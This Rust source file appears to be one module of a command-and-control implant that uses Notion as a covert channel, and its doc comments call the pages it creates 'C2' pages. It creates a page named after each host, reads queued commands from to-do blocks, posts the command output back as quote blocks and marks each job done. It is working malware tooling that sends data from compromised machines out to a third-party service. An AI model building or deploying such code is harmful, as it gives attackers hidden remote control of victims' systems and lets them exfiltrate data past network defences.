use reqwest::{Client};
use serde_json::{json};

use crate::config::{URL_BASE, ConfigOptions};

/// Sends the result of a command back to the to-do block that made the request.
pub async fn send_result(client: &Client, command_block_id: &str, output: String) {
    let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
    let body : serde_json::Value = json!({
        "children": [
            {
                "object": "block",
                "type": "quote",
                "quote": {
                    "text": [
                        {
                            "type": "text",
                            "text": {"content": output},
                            "annotations": {"code": true}
                        }
                    ]
                }
            }
        ]
    });
    let r = client
        .patch(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if !r.status().is_success() {
        println!("{}",r.text().await.unwrap());
    }
}

/// Creates a new C2 page in Notion.
/// 
/// The returned value is the id of the new page, to be used with
/// `doc::get_blocks()`
pub async fn create_page(client: &Client, config_options: &ConfigOptions, hostname: String) -> Option<String> {
    println!("Creating page...");
    let url = format!("{}/pages/", URL_BASE);
    
    // Craft JSON Body
    let body: serde_json::Value = json!({
        "parent": {
            "type": "page_id",
            "page_id": config_options.parent_page_id
        },
        "properties": {
            "title": [{
                "text": {
                    "content": hostname
                }
            }]
        }
    });
    let r = client
        .post(url)
        .json(&body)
        .send()
        .await
        .unwrap();
    
    if r.status().is_success() {
        let res_body = r.json::<serde_json::Value>().await.unwrap();
        return Some(String::from(res_body["id"].as_str()?));
    }
    println!("{}",r.text().await.unwrap());
    None
}

/// Retrieves blocks from Notion. All children blocks of the parent page returned
/// TODO: Account for pagination for > 100 children.
pub async fn get_blocks(client: &Client, page_id: &String) -> Result<serde_json::Value, String> {
    let url = format!("{URL_BASE}/blocks/{page_id}/children");

    let r = client.get(url).send().await.unwrap();

    if r.status().is_success() {
        println!("Got blocks");
        let blocks = r.json::<serde_json::Value>().await.unwrap();
        match blocks.get("results") {
            Some(bs) => {
                println!("{:?}", bs);
                return Ok(bs.to_owned())
            },
            None => return Ok(json!([]))
        }
    }
    Err(r.text().await.unwrap())
}

/// Marks a job done by making the to-do item checked.
pub async fn complete_command(client: &Client, mut command_block: serde_json::Value) {
    
    // Set completed status
    command_block["to_do"]["checked"] = serde_json::to_value(true).unwrap();
    let block_id = command_block["id"].as_str().unwrap();
    let url = format!("{URL_BASE}/blocks/{block_id}");
    let r = client
        .patch(url)
        .json(&command_block)
        .send()
        .await
        .unwrap();

    if !r.status().is_success() {
        println!("{}",r.text().await.unwrap());
    }
}